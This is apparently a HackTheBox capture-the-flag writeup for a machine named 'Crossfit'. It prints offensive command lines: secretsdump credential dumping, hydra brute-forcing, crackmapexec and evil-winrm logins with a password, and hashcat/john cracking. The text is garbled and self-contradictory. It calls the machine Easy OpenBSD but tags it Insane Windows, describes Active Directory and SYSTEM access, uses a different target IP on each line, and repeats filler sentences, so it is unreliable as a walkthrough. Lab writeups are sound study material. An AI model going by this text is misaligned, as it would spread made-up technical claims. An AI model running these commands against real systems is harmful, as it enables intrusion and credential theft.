---
TitleSEO: "HackTheBox — Crossfit (Easy OpenBSD) | ZureFX"
TitlePost: "HackTheBox — Crossfit (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Crossfit. Golden Ticket and Sudo Misconfiguration to achieve easy compromise on OpenBSD."
Keywords: "insane, linux, windows, hackthebox, medium"
URL: "https://zurefx.github.io/writeups/htb-crossfit-371.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-crossfit-371/"
Date: "2025-11-21"
Tags: "Insane, Linux, Windows, HackTheBox, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-crossfit-371"
Permalink: "/writeups/htb-crossfit-371.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Crossfit** is rated **Easy** on HackTheBox. It runs **OpenBSD** and the IP address during this analysis was `10.59.204.6`.

### Objectives

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.135.66
crackmapexec smb 10.39.110.233 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.75.21.122/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

### Service Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.59.201.10/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.123.30.79 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.74.76.22 -u administrator -p 'P@ssw0rd!' --shares
```

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file.

```bash
feroxbuster -h
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials.

Key finding: **Golden Ticket**.

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine.

### Initial Access

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
crackmapexec smb 10.43.220.83 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.85.201.204/FUZZ
crackmapexec smb 10.35.209.181 -u administrator -p 'P@ssw0rd!' --shares
```

Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
evil-winrm -i 10.115.69.190 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.77.30.150 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.35.28.33/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `lookupsid`
- `GetNPUsers`
- `metasploit`
- `pwncat`
- `GetUserSPNs`

### Key Takeaways

- Golden Ticket
- Sudo Misconfiguration
- Docker Escape
- Writable PATH
